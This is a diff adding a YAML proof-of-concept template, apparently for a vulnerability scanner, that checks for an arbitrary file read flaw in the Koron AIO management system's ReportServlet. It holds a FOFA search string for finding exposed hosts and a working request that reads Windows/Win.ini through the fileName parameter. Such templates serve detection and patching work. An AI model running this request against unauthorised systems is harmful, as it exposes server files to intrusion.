@@ -1,0 +1,15 @@
+id: poc-yaml-koron-aio-reportservlet-anyfile-read
+info:
+  name: 科荣AIO管理系统 ReportServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 科荣 AIO 管理系统
+  fofa: body="changeAccount('8000')"
+requests:
+- method: GET
+  path: /ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
+  expression: status_code == 200 && contains(body,"; for 16-bit app support") && contains(body,"[files]")
+    && !contains(body,"<")
+variables: {}
+transport: http
